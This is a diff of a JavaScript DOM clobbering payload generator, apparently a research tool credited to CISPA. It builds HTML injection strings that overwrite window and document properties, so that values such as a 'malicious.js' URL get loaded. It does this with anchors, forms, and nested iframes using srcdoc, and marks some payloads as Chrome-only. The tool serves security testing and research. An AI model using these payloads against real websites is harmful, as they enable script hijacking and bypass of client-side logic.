@@ -1,44 +1,10 @@
-/*
-    Copyright (C) 2022  Soheil Khodayari, CISPA
-    This program is free software: you can redistribute it and/or modify
-    it under the terms of the GNU Affero General Public License as published by
-    the Free Software Foundation, either version 3 of the License, or
-    (at your option) any later version.
-    This program is distributed in the hope that it will be useful,
-    but WITHOUT ANY WARRANTY; without even the implied warranty of
-    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
-    GNU Affero General Public License for more details.
-    You should have received a copy of the GNU Affero General Public License
-    along with this program.  If not, see <http://www.gnu.org/licenses/>.
-
-
-    Description:
-    ------------
-    HTML Payload Generation for Clobbering DOMC Sources
-*/
-
-/**
- * DOMClobberingPayloadGenerator
- * @constructor
- */
-function DOMClobberingPayloadGenerator() {
-    "use strict";
-}
-
-/**
- * create_dom_clobbering_html_payload(statement)
- * @param statement: {
- *		"clobbering_target": "window.x.y",
- *		"clobbering_value": "malicious.js"
- *	}
- */
-DOMClobberingPayloadGenerator.prototype.create_dom_clobbering_html_payload = function (statement) {
+let create_dom_clobbering_html_payload = function (statement) {
     let output = [];
     const clobbering_value = statement.clobbering_value;
     const code_targets = statement.clobbering_target.split('.');
     var html = ["a","abbr","acronym","address","applet","area","article","aside","audio","b","base","basefont","bdi","bdo","bgsound","big","blink","blockquote","body","br","button","canvas","caption","center","cite","code","col","colgroup","command","content","data","datalist","dd","del","details","dfn","dialog","dir","div","dl","dt","element","em","embed","fieldset","figcaption","figure","font","footer","form","frame","frameset","h1","head","header","hgroup","hr","html","i","iframe","image","img","input","ins","isindex","kbd","keygen","label","legend","li","link","listing","main","map","mark","marquee","menu","menuitem","meta","meter","multicol","nav","nextid","nobr","noembed","noframes","noscript","object","ol","optgroup","option","output","p","param","picture","plaintext","pre","progress","q","rb","rp","rt","rtc","ruby","s","samp","script","section","select","shadow","slot","small","source","spacer","span","strike","strong","style","sub","summary","sup","svg","table","tbody","td","template","textarea","tfoot","th","thead","time","title","tr","track","tt","u","ul","var","video","wbr","xmp"]
     var props=[];
-    // document.a.s.c.v
+    
     const chainIframes = function (clobbering_target, n) {
         if (clobbering_target.length - 2 === n) {
             return `<a id='${clobbering_target[n+1]}'${clobbering_value ? ` href='${clobbering_value}'` : ''}></a>`;
@@ -81,7 +47,7 @@ DOMClobberingPayloadGenerator.prototype.create_dom_clobbering_html_payload = fun
                 ]);
             }
             
-            else if(clobbering_value === ""){                        // in this Just clobbering case -> any tag with id works for window clobbering could add more 
+            else if(clobbering_value === ""){                        // in this Just clobbering  -> any tag with id works for window clobbering could add more 
                 output = output.concat([
                     `<anytag id="${code_targets[1]}"> works basically`
                 ]);
@@ -105,7 +71,7 @@ DOMClobberingPayloadGenerator.prototype.create_dom_clobbering_html_payload = fun
 
 			if(statement.clobbering_value === ""){
                 output = output.concat([
-					`<a id="${code_targets[1]}"></a><a id="${code_targets[1]}" name="${code_targets[2]}" href="${clobbering_value}"></a>`,
+					`Chrome: <a id="${code_targets[1]}"></a><a id="${code_targets[1]}" name="${code_targets[2]}" href="${clobbering_value}"></a>`,
 					`<form id="${code_targets[1]}"><input id="${code_targets[2]}"/> </form>`,
 					`<form id="${code_targets[1]}"><button id="${code_targets[2]}"/> </form>`,
 					`<form id="${code_targets[1]}"><img id="${code_targets[2]}" src="${clobbering_value}" /> </form>`,
@@ -187,15 +153,7 @@ DOMClobberingPayloadGenerator.prototype.create_dom_clobbering_html_payload = fun
                             `<form id="${code_targets[1]}"><textarea id="${code_targets[2]}" value="${clobbering_value}"/></form>`,
                             `<form id="${code_targets[1]}"><object id="${code_targets[2]}" value="${clobbering_value}" data="${clobbering_value}" /></form>`,
                         ]);
-                    } else if (code_targets[3] === 'href') {
-                        //  window.x.y.href
-                        output = output.concat([
-                            `<a id="${code_targets[1]}"></a><a id="${code_targets[1]}" name="${code_targets[2]}" href="${clobbering_value}"></a>`,
-                            `<form id="${code_targets[1]}">\n<form id="${code_targets[1]}" name="${code_targets[2]}">\n  <input name="${code_targets[3]}">\n</form>`,
-                            chainIframes(code_targets, 0),
-                        ]);
-                    
-                    } else if (code_targets[3] === 'username') {
+                    }  else if (code_targets[3] === 'username') {
                         //  window.x.y.username works only on chrome 
                         output = output.concat([
                             `Chrome : <a id="${code_targets[1]}"></a><a id="${code_targets[1]}" name="${code_targets[2]}" href="${clobbering_value}:x@x.com"></a>`,
@@ -216,10 +174,8 @@ DOMClobberingPayloadGenerator.prototype.create_dom_clobbering_html_payload = fun
                         
                         ]);
                     
-                    } else if (code_targets_length === 4) {
-            
-            
-                        // CASE 1.6: window.x.y.z we need </form> for the form payload to become a HTML Collection!!
+                    } else{            
+                        //  window.x.y.z we need </form> for the form payload to become a HTML Collection!!
                         output = output.concat([
                             `Chrome : <form id="${code_targets[1]}">\n</form><form id="${code_targets[1]}" name="${code_targets[2]}">\n <input name="${code_targets[3]}" value="${clobbering_value}">\n</form>`,
                             `<base href="x:"><iframe name=${code_targets[1]} srcdoc="<iframe name=${code_targets[2]} srcdoc='<a id=${code_targets[3]} href=${clobbering_value}>'></iframe>"></iframe>`,
@@ -231,32 +187,26 @@ DOMClobberingPayloadGenerator.prototype.create_dom_clobbering_html_payload = fun
         
         
         else if (code_targets_length === 5) {
-                    // CASE 1.7: window.x.y.z.w
+                    // window.x.y.z.w could add support for username and password host
                     let last_src_doc = `<a id=${code_targets[code_targets_length - 2]}></a><a id=${code_targets[code_targets_length - 2]} name=${code_targets[code_targets_length - 1]} href=${clobbering_value}></a>`;
-                    let payload = `<iframe name="${code_targets[1]}" srcdoc="<iframe name='${code_targets[2]}' srcdoc='${last_src_doc}'></iframe>"></iframe>`;
+                    let payload = `Chrome : <iframe name="${code_targets[1]}" srcdoc="<iframe name='${code_targets[2]}' srcdoc='${last_src_doc}'></iframe>"></iframe>`;
                     output = output.concat([payload]);
         }
-        
-        
-        else if (code_targets_length === 6 && code_targets[5] === 'href') {
-                    // CASE 1.8: window.x.y.z.w.href
-                    let last_src_doc = `<a id=${code_targets[code_targets_length - 2]}></a><a id=${code_targets[code_targets_length - 2]} name=${code_targets[code_targets_length - 1]} href=${clobbering_value}></a>`;
-                    let payload = `<iframe name="${code_targets[1]}" srcdoc="<iframe name='${code_targets[2]}' srcdoc='${last_src_doc}'></iframe>"></iframe>`;
-                    output = output.concat([payload]);
-        } 
-        
-        
-        
-        
+                
         else {
-            // CASE 1.9: for higher levels, recursively chain iframes to create nested frames of length n
+            // for higher levels, recursively chain iframes to create nested frames of length n
             let payload = chainIframes(code_targets, 0);
             output = output.concat([payload]);
         }
     }
-    // ---------------------------
-    // CASE 2: document.X
-    // ---------------------------
+    
+
+
+    // Document Object clobbering
+
+
+
+
     else {
         const code_targets_length = code_targets.length;
         if (code_targets_length === 1) {
@@ -270,16 +220,17 @@ DOMClobberingPayloadGenerator.prototype.create_dom_clobbering_html_payload = fun
         }
 
         else if (code_targets_length === 2) {
-            // CASE 2.1: document.x
+            // document.x
             output = output.concat([
                 `<embed name="${code_targets[1]}" src="${clobbering_value}"></embed>`,
                 `<img name="${code_targets[1]}" src="${clobbering_value}"></img>`,
+                `<image name="${code_targets[1]}" src="${clobbering_value}"></img>`,
                 `<object id="${code_targets[1]}" data="${clobbering_value}"></object>`,
                 `<form name="${code_targets[1]}"></form>`,
-                `Chrome : <iframe name="${code_targets[1]}"></iframe>`,
+                `Chrome : <iframe name="${code_targets[1]}"></iframe>`, // possilbe to do 
             ]);
         } else if (code_targets_length === 3) {
-            // CASE 2.2: document.x.y
+            // document.x.y
             output = output.concat([
                 `<form name="${code_targets[1]}"></form> <form name="${code_targets[1]}" id="${code_targets[2]}"></form>`,
                 `<form name="${code_targets[1]}"><img name="${code_targets[2]}" src="${clobbering_value}"></form>`,
@@ -287,15 +238,15 @@ DOMClobberingPayloadGenerator.prototype.create_dom_clobbering_html_payload = fun
                 `<object id=${code_targets[1]}><img id="${code_targets[1]}" name="${code_targets[2]}" src="${clobbering_value}" /></object>`,
             ]);
         } else if (code_targets_length === 4) {
-            // CASE 2.3: document.x.y.z
+            // document.x.y.z for name= attr should be used and needs </form> to become a HTML Collection
             output = output.concat([
-                `<form id="${code_targets[1]}">\n<form id="${code_targets[1]}" name="${code_targets[2]}">\n <input name="${code_targets[3]}" value="${clobbering_value}">\n</form>`,
-                chainIframes(code_targets, 0),
+                `<form name="${code_targets[1]}"></form><form name="${code_targets[1]}" id="${code_targets[2]}">\n <input name="${code_targets[3]}" value="${clobbering_value}">\n</form>`,
+                `Chrome : ${chainIframes(code_targets, 0)}`,
             ]);
         } else {
-            // CASE 2.4: higher levels
-            let payload = chainIframes(code_targets, 0);
-            output = output.concat([payload]);
+            //  higher levels works only on chrome
+            let payload = chainIframes(code_targets, 0);    
+            output = output.concat([`Chrome : ${payload}`]);
         }
     }
 
@@ -327,7 +278,7 @@ function copyToClipboard(elem, copied_banner) {
     });
 }
 
-const payload_generator = new DOMClobberingPayloadGenerator();
+
 const submit_button = document.getElementById('submit');
 const results_container = document.getElementById('clobbering-result');
 
@@ -343,7 +294,7 @@ submit_button.addEventListener('click', (e) => {
     }
     
 
-    var outputs = payload_generator.create_dom_clobbering_html_payload({
+    var outputs = create_dom_clobbering_html_payload({
         "clobbering_target": clobbering_target,
         "clobbering_value": clobbering_value
     });
